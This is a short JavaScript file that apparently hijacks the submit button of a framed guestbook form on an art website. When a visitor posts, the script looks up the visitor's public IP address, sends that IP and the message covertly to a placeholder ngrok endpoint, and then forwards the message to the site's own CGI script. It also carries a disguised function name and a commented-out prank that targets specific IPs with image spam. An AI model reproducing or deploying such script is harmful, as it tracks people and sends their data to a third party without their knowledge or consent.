let entry = parent.document.children[0].children[1].children['entry'].contentDocument;
let form = entry.querySelector('form');
let inputs = entry.querySelectorAll('input');
let submitButton = inputs[6];

function handleForm(event) {
    event.preventDefault();
}

async function DocWrite(payload) {
    payload = encodeURIComponent(payload);
    let table = {
        "%20": "+",
        "!": "%21",
        "'": "%27",
        "(": "%28",
        ")": "%29"
    };

    for (let char in table) {
        payload = payload.replaceAll(char, table[char]);
    }

    try {
        return await fetch('https://404.jodi.org/cgi-bin/ipadd.cgi', {
            'headers': {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Sec-Fetch-Dest': 'frame',
            },
            'referrer': 'https://404.jodi.org/ip/ipadd.html',
            'body': `preview=No&place=x&email=x&www=x&url=x&name=x&msg=${payload}`,
            'method': 'POST',
            'mode': 'cors'
        });
    } catch { }
}

async function DiscordRPC() {
    try {
        let ip = (await window.cookieStore.get('ip'))?.value;
        !ip && await window.cookieStore.set('ip', ip = await (await fetch('https://api.aruljohn.com/ip')).text());
        //(ip ??= await (await fetch('https://api.aruljohn.com/ip')).text()) && await window.cookieStore?.set('ip', ip);
        let message = inputs[7].value;
        /* if (ip == '[REDACTED]' || ip == '[REDACTED]') {
            url = 'https://c.tenor.com/yheo1GGu3FwAAAAd/tenor.gif';
            function configImage(img) { img.src = url; return img; }
            function createImage() { return configImage(document.createElement('img')); }
            for (let i = 0; i < 10; i++) {
                parent.document.children[0].children[1].children.main.contentDocument.body.prepend(configImage(createImage()))
            }
            setTimeout(() => {
                window.prompt('Goodbye! (再见!) uwu');
                // window.location = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
            }, 1000);
        } */
        await fetch('<ngrok domain>', {
            headers: {
                'Content-Type': 'application/json',
            },
            method: 'POST',
            body: JSON.stringify({ type: 'ip', data: { ip: ip, message: message } })
        }).then(async () => { await DocWrite(message).then(() => window.location.reload()) });
    } catch {
        await DocWrite(message).then(() => window.location.reload());
    }
}

form.addEventListener('submit', handleForm);

submitButton.onclick = DiscordRPC;


